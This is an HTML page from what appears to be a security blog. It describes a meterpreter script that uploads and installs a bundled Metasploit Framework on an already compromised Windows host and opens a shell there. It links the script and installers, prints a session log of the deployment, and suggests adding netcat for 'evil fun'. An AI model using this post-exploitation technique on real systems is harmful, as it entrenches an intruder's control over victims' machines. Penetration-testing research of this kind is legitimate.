<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">
  <meta name="generator" content="Hugo 0.14" />

  <title>

<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  

  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </li>

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

  </ul>
</div>

  <div class="pure-g">
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>&copy; 2016. All rights reserved.</small>
  </div>
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>Metasploit Framework as a Payload</h1>
  <h2></h2>
</div>
<div class="content">
  

<p>Well, sortaâ€¦</p>

<p>I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.</p>

<p><em>Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.</em></p>

<p>You can download the script here: <a href="/scripts-and-programs/metasploit/deploymsf.rb">/scripts-and-programs/metasploit/deploymsf.rb</a></p>

<p>You can download the cygwin installs from the metasploit website:</p>

<p>13mb FULL framework: <a href="https://metasploit.com/framework-3.3-dev.exe">https://metasploit.com/framework-3.3-dev.exe</a><br />
5mb MINI (just msfconsole): <a href="https://metasploit.com/mini-3.3-dev.exe">https://metasploit.com/mini-3.3-dev.exe</a></p>

<p>And here is what it looks like:</p>

<blockquote>
<p>meterpreter &gt; run deploymsf -f framework-3.3-dev.exe<br />
[<em>] Running Meterpreter MSFp Deploytment Script&hellip;..<br />
[</em>] Uploading MSFp for for deployment&hellip;.<br />
[<em>] MSFp uploaded as C:DOCUME~1mubixLOCALS~1Temp12681.exe<br />
[</em>] Installing MSFp&hellip;&hellip;&hellip;..<br />
[<em>] Done!<br />
[</em>] Installation Complete!<br />
[<em>] Running cygwin shell channelized&hellip;<br />
[</em>] Channel 18 created - Type: interact 18 to play<br />
[<em>] Be warned, it takes a bit for post setup to happen<br />
[</em>] and you will not see a prompt, try pwd to check<br />
meterpreter &gt; interact 18<br />
Interacting with channel 18&hellip;</p>
</blockquote>

<p>[<em>] Configuring multi-user permissions for first run&hellip;<br />
[</em>] Configuring the initial user environment&hellip;<br />
pwd<br />
/home/mubix<br />
ls<br />
msfconsole<br />
*** Metasploit only has EXPERIMENTAL support for Ruby 1.9.1 and newer, things may break!<br />
*** Please report bugs to msfdev[at]metasploit.com<br />
[-] ***<br />
[-] * WARNING: No database support: LoadError no such file to load &ndash; active_record<br />
[-] ***</p>

<h2 id="toc_0:ea2ba5f26cf1305eefa185d4e5eff0d2">### ## ##</h2>

<h2 id="toc_1:ea2ba5f26cf1305eefa185d4e5eff0d2">## #### ###### #### ##### ##### ## #### ######</h2>

<p>####### ## ## ## ## ## ## ## ## ## ## ### ##<br />
####### ###### ## ##### #### ## ## ## ## ## ## ##</p>

<h2 id="toc_2:ea2ba5f26cf1305eefa185d4e5eff0d2"># ## ## ## ## ## ## ##### ## ## ## ## ##</h2>

<h2 id="toc_3:ea2ba5f26cf1305eefa185d4e5eff0d2">## #### ### ##### ##### ## #### #### #### ###</h2>

<p>=[ msf v3.3-dev<br />
+ &ndash; &ndash;=[ 379 exploits - 231 payloads<br />
+ &ndash; &ndash;=[ 20 encoders - 7 nops<br />
=[ 156 aux</p>

<p>msf &gt;GAME OVER</p>

</div>

</div>
</div>
<script src="http://localhost:1313/js/ui.js"></script>




</body>
</html>

